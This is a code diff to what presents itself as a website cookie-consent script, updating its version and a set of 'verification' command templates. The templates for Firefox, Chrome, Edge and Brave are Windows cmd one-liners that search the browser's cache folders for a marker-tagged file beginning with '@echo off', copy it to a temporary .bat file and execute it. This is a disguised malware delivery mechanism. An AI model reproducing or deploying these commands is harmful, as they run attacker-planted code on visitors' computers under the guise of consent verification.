@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.6.3',
+    version: '1.6.4',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
     accentColor: '#1b6369',
@@ -24,10 +24,10 @@
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"'
+      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"'
     }
   };
 
